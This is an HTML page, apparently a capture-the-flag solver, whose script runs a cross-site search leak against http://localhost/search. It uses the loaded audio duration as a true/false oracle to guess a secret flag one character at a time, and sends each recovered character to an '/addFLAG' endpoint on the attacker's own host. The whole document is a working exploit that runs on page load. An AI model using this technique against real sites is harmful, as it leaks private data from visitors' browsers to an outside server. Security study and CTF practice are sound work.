<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>solv</title>
</head>
<body>
    <script>
        const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
        const FLAG_START = '{{ flag }}';
        
        const leak = async (url) => {
            return new Promise(r => {
                let audio = document.createElement('audio')
                audio.src = url
                audio.onloadedmetadata = (e) => {
                    let duration = e.target.duration
                    e.target.remove()
                    console.debug(duration)
                    // 30초면 false(0), 30.1초면 true(1) 반환
                    if(duration <= 30.0){
                        return r(0)
                    }else{
                        return r(1)
                    }
                }
                document.body.appendChild(audio)
            })
        }

        const exploit = async () => {
            let flag = FLAG_START;	
            while (!flag.includes("}")) {
                for (let char of ALPHABET) {
                    if (await leak(`http://localhost/search?query=${flag + char}`)) {
                        flag += char;
                        await fetch('/addFLAG?flag=' + char);
                        break;
                    }
                }
            }
        }
        exploit();
    </script>
</body>
</html>